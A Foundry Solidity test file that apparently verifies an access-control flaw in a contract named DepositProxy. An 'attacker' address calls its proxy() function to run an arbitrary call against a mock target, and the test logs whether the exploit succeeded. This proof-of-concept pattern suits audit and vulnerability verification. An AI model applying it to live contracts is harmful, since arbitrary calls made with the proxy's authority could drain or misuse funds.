// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import "../src/0xb11b2fed6c9354f7aa2f658d3b4d7b31d8a13b77.sol";

contract DepositProxyTest is Test {
    address internal deployer;
    address internal attacker;
    DepositProxy internal depositProxy;
    
    function setUp() public {
        deployer = makeAddr("deployer");
        attacker = makeAddr("attacker");
        
        // Deploy without value to avoid deposit() call in constructor
        vm.prank(deployer);
        depositProxy = new DepositProxy();
    }

    function testProxyAccessVulnerability() public {
        // Create mock target contract
        MockAttackTarget attackTarget = new MockAttackTarget();
        
        console2.log("--- BEFORE-Trigger ---");
        address lastCallerBefore = attackTarget.lastCaller();
        console2.log("BEFORE: MockAttackTarget.lastCaller =", lastCallerBefore);

        console2.log("--- Trigger Operation ---");
        vm.prank(attacker);
        depositProxy.proxy(
            address(attackTarget),
            abi.encodeWithSignature("attackFunction()")
        );

        console2.log("--- AFTER-Trigger ---");
        address lastCallerAfter = attackTarget.lastCaller();
        console2.log("AFTER: MockAttackTarget.lastCaller =", lastCallerAfter);

        bool exploitSuccess = (lastCallerAfter == address(depositProxy));
        console2.log("COMPARISON VERDICT: Exploit %s", exploitSuccess ? "SUCCESS" : "FAILED");
        console2.log("  Reason: %s", exploitSuccess ? "lastCaller matches depositProxy" : "lastCaller not modified");

        // Final verdict
        if (exploitSuccess) {
            console2.log("Vulnerability Exists: Attacker successfully executed arbitrary call via proxy");
        } else {
            console2.log("Vulnerability not Exist: Proxy call did not execute as attacker expected");
        }
    }
}

contract MockAttackTarget {
    address public lastCaller;
    
    function attackFunction() external {
        lastCaller = msg.sender;
    }
}